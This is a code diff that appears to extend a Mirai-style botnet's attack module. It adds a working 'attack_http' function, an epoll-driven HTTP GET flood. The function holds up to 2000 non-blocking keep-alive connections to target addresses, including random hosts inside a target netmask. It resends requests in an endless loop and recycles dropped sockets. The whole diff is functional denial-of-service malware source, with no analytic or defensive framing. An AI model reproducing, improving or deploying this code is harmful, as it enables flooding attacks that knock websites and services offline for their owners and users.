@@ -16,11 +16,15 @@
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include <errno.h>
-
 #include "includes.h"
 #include "attack.h"
 #include "checksum.h"
 #include "rand.h"
+#include <sys/epoll.h>
+#include <stdio.h>
+
+#define MAX_EPOLL_EVENTS 512
+#define MAX_HTTP_SOCKETS 2000
 
 void attack_tcpstream(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
@@ -267,6 +271,158 @@ void attack_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
     }
 
     return;
+}
+
+struct http_conn {
+    int fd;
+    int target_idx;
+    int state; // 0: libre, 1: conectando, 2: activo
+    time_t last_used;
+    int requests_sent;
+};
+
+void attack_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, epoll_fd;
+    struct epoll_event ev, events[MAX_EPOLL_EVENTS];
+    struct http_conn *conns;
+    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 500);
+    if (max_conns > MAX_HTTP_SOCKETS) max_conns = MAX_HTTP_SOCKETS;
+
+    // Opciones HTTP
+    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
+    if (domain == NULL) return;
+    char *path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, "/");
+    uint16_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
+
+    // Construir petición GET
+    char request[512];
+    int req_len = snprintf(request, sizeof(request),
+        "GET %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: Mozilla/5.0\r\n"
+        "Accept: */*\r\n"
+        "Connection: keep-alive\r\n"
+        "\r\n",
+        path, domain);
+
+    // Crear epoll (usamos epoll_create en lugar de epoll_create1 por compatibilidad)
+    epoll_fd = epoll_create(MAX_HTTP_SOCKETS);
+    if (epoll_fd == -1) return;
+
+    // Crear pool de conexiones
+    conns = calloc(max_conns, sizeof(struct http_conn));
+    if (conns == NULL) { close(epoll_fd); return; }
+
+    int active_conns = 0;
+
+    while (1) {
+        // Llenar el pool hasta max_conns
+        for (i = 0; i < max_conns && active_conns < max_conns; i++) {
+            if (conns[i].state == 0) {
+                int t_idx = i % targs_len;
+                struct attack_target *target = &targs[t_idx];
+                int fd = socket(AF_INET, SOCK_STREAM, 0);
+                if (fd == -1) continue;
+
+                // Establecer no bloqueante con fcntl (en lugar de SOCK_NONBLOCK)
+                int flags = fcntl(fd, F_GETFL, 0);
+                fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+
+                struct sockaddr_in addr;
+                addr.sin_family = AF_INET;
+                if (target->netmask < 32)
+                    addr.sin_addr.s_addr = htonl(ntohl(target->addr) + (((uint32_t)rand_next()) >> target->netmask));
+                else
+                    addr.sin_addr.s_addr = target->addr;
+                addr.sin_port = htons(dport);
+
+                connect(fd, (struct sockaddr*)&addr, sizeof(addr));
+
+                conns[i].fd = fd;
+                conns[i].target_idx = t_idx;
+                conns[i].state = 1; // conectando
+                conns[i].last_used = time(NULL);
+                conns[i].requests_sent = 0;
+
+                ev.events = EPOLLOUT | EPOLLERR | EPOLLHUP; // sin EPOLLRDHUP
+                ev.data.ptr = &conns[i];
+                epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev);
+                active_conns++;
+            }
+        }
+
+        int nfds = epoll_wait(epoll_fd, events, MAX_EPOLL_EVENTS, 1000);
+        time_t now = time(NULL);
+
+        for (i = 0; i < nfds; i++) {
+            struct http_conn *c = (struct http_conn*)events[i].data.ptr;
+            if (events[i].events & (EPOLLERR | EPOLLHUP)) {
+                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
+                close(c->fd);
+                c->state = 0;
+                active_conns--;
+                continue;
+            }
+            if (events[i].events & EPOLLOUT) {
+                if (c->state == 1) {
+                    // Conexión establecida
+                    int err;
+                    socklen_t len = sizeof(err);
+                    getsockopt(c->fd, SOL_SOCKET, SO_ERROR, &err, &len);
+                    if (err != 0) {
+                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
+                        close(c->fd);
+                        c->state = 0;
+                        active_conns--;
+                        continue;
+                    }
+                    c->state = 2; // activo
+                    // Cambiar a monitorear lectura (para keep-alive) y escritura
+                    ev.events = EPOLLIN | EPOLLOUT | EPOLLHUP;
+                    ev.data.ptr = c;
+                    epoll_ctl(epoll_fd, EPOLL_CTL_MOD, c->fd, &ev);
+                }
+                if (c->state == 2) {
+                    int sent = send(c->fd, request, req_len, MSG_NOSIGNAL);
+                    if (sent <= 0) {
+                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
+                        close(c->fd);
+                        c->state = 0;
+                        active_conns--;
+                    } else {
+                        c->requests_sent++;
+                        c->last_used = now;
+                    }
+                }
+            }
+            if (events[i].events & EPOLLIN) {
+                char buf[1024];
+                int n = recv(c->fd, buf, sizeof(buf), MSG_DONTWAIT);
+                if (n <= 0) {
+                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, c->fd, NULL);
+                    close(c->fd);
+                    c->state = 0;
+                    active_conns--;
+                } else {
+                    c->last_used = now;
+                }
+            }
+        }
+
+        // Timeouts
+        for (i = 0; i < max_conns; i++) {
+            if (conns[i].state != 0 && now - conns[i].last_used > 30) {
+                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conns[i].fd, NULL);
+                close(conns[i].fd);
+                conns[i].state = 0;
+                active_conns--;
+            }
+        }
+    }
+
+    close(epoll_fd);
+    free(conns);
 }
 
 void attack_wraflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
